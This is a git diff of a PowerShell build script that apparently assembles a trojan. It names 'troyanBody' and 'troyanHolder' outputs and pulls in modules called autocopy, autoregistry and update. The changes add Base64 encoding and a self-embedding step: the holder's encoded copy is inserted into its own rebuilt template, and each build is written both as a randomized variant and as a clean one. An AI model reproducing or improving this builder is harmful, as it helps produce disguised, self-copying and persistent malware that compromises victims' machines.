@@ -141,6 +141,22 @@ function Encode-FileToBase64 {
     return $encodedContent
 }
 
+function Convert-StringToBase64 {
+    param (
+        [Parameter(Mandatory = $true)]
+        [string]$InputString
+    )
+    
+    # Convert the string to bytes
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
+    
+    # Encode the bytes to a Base64 string
+    $base64String = [Convert]::ToBase64String($bytes)
+    
+    # Return the Base64-encoded string
+    return $base64String
+}
+
 function Convert-ArrayToQuotedString {
     param (
         [Parameter(Mandatory=$true)]
@@ -222,7 +238,7 @@ function Format-ArrayToString {
 }
 
 function Make-Template { 
-    param ([string]$target)
+    param ([string]$target, [bool]$short, [string]$selfTemplate)
     $template = @"
     `$server = '_SERVER' | ConvertFrom-Json
 
@@ -243,7 +259,14 @@ function Make-Template {
         `$xembed_name = @(
         _EMBED_NAME
         )
+
 "@
+        if ($short -eq $false)
+        {
+            $template += @"
+            `$xholder = "__SELF"
+"@
+        }
         $body = Encode-FileToBase64 -inFile $server.troyanBody
         $template = $template -replace "__BODY", $body
         ($name, $data) = Create-EmbeddingFiles -name "front"
@@ -252,6 +275,10 @@ function Make-Template {
         ($name, $data) = Create-EmbeddingFiles -name "embeddings"
         $template = $template -replace "_EMBED_X", $data
         $template = $template -replace "_EMBED_NAME", $name
+        if ($short -eq $false)
+        {
+            $template = $template -replace "__SELF", $selfTemplate
+        }
     }
 
     if ($target -eq "body")
@@ -299,24 +326,25 @@ function Make-Ps1Files {
 
     $allFiles = Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1"
     
-    $baseFiles = @($allFiles | Where-Object { $_.Name -in @("utils.ps1")})
     
-    $holderFiles = @(
-        $allFiles | Where-Object { $_.Name -in @("consts_holder.ps1", "autocopy.ps1", "autoregistry.ps1", "embeddings.ps1", "update.ps1") }
-    )
+    $holderFiles = @()
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("consts_holder.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("autocopy.ps1", "autoregistry.ps1", "embeddings.ps1", "update.ps1") }
+    $holderFiles += $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
 
-    $returnFiles = $baseFiles
-
-    if ($target -eq "holder") {
-        $returnFiles += $holderFiles
-        $returnFiles += $allFiles | Where-Object { $_.Name -in @("holder.ps1") }
+    if ($target -eq "holder")
+    {
+        return $holderFiles
     }
 
     if ($target -eq "body") {
         $holderFileNames = $holderFiles.Name
+        $returnFiles = @()
         $returnFiles += $allFiles | Where-Object { $_.Name -in @("consts_body.ps1") }
-        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderFileNames -and $_.Name -notin @("holder.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")  }
-        $returnFiles +=  $allFiles | Where-Object { $_.Name -in @("program.ps1")}
+        $returnFiles += $allFiles | Where-Object { $_.Name -in @("utils.ps1") }
+        $returnFiles += $allFiles | Where-Object { $_.Name -notin $holderFileNames -and $_.Name -notin @("utils.ps1") -and $_.Name -notin @("program.ps1")  -and $_.Name -notin @("consts_body.ps1")  }
+        $returnFiles += $allFiles | Where-Object { $_.Name -in @("program.ps1")}
     }
 
     return $returnFiles
@@ -373,15 +401,20 @@ function BuldScript{
     Utf8NoBom -data $joinedContent -file $outputFile
 }
 
-$template = Make-Template -target "body"
+$template = Make-Template -target "body" -short $false -selfTemplate ""
 $files = Make-Ps1Files -target "body"
 BuldScript -template $template -files $files -outputFile $server.troyanBody -random $true
 BuldScript -template $template -files $files -outputFile $server.troyanBodyClean -random $false
 $encoded = Encode-FileToBase64 -inFile $server.troyanBody
 Utf8NoBom -data $encoded -file $server.userTroyanBody
 
+$template = Make-Template -target "holder" -short $true -selfTemplate ""
+$files = Make-Ps1Files -target "holder"
+BuldScript -template $template -files $files -outputFile $server.troyanHolder -random $true
+BuldScript -template $template -files $files -outputFile $server.troyanHolderClean -random $false
+$encoded = Encode-FileToBase64 -inFile $server.troyanHolder
 
-$template = Make-Template -target "holder"
+$template = Make-Template -target "holder" -short $false -selfTemplate $encoded
 $files = Make-Ps1Files -target "holder"
 BuldScript -template $template -files $files -outputFile $server.troyanHolder -random $true
 BuldScript -template $template -files $files -outputFile $server.troyanHolderClean -random $false
